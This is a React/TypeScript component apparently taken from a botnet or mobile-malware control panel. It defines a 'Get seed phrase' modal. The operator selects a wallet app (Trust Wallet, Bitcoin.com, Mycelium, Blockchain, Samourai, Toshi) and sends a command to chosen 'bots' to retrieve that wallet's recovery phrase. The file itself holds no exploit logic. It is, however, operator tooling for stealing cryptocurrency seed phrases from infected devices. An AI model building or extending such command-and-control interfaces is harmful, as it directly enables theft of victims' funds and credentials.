import React from "react";
import {Col, Form, Modal, Radio, Row} from "antd";
import {ModalWithSelectedBotsProps} from "../../../Model/Modal";
import {getBotsId} from "../../../Util/getBotIds";
import sendCommand from "../../../Requests/Commands/sendCommands";

const GetSeedPhrase: React.FC<ModalWithSelectedBotsProps> = (props: ModalWithSelectedBotsProps) => {
    const [form] = Form.useForm();

    const closeModal = () => {
        props.setVisible(false);
        form.resetFields();
    };

    const formSubmit = () => {
        sendCommand({
            command: form.getFieldValue("seed"),
            payload: [],
            botIds: getBotsId(props.selectedBots),
        });

        closeModal();
    };

    return (
        <Modal
            title="Get seed phrase"
            visible={props.visible}
            onCancel={closeModal}
            onOk={() => form.submit()}
            okText="Send"
            width={340}
            destroyOnClose
        >
            <Form form={form} layout="vertical" onFinish={formSubmit}>
                <Form.Item label="Seed phrase:" name="seed" initialValue="trust">
                    <Radio.Group>
                        <Row>
                            <Col span={12}>
                                <Radio value="trust">Trust wallet</Radio>
                            </Col>
                            <Col span={12}>
                                <Radio value="bitcoincom">Bitcoin.com</Radio>
                            </Col>
                            <Col span={12}>
                                <Radio value="mycelium">MyCelium</Radio>
                            </Col>
                            <Col span={12}>
                                <Radio value="piuk">BlockChain</Radio>
                            </Col>
                            <Col span={12}>
                                <Radio value="samourai">Samourai</Radio>
                            </Col>
                            <Col span={12}>
                                <Radio value="toshi">Toshi</Radio>
                            </Col>
                        </Row>
                    </Radio.Group>
                </Form.Item>
            </Form>
        </Modal>
    );
};

export default GetSeedPhrase;
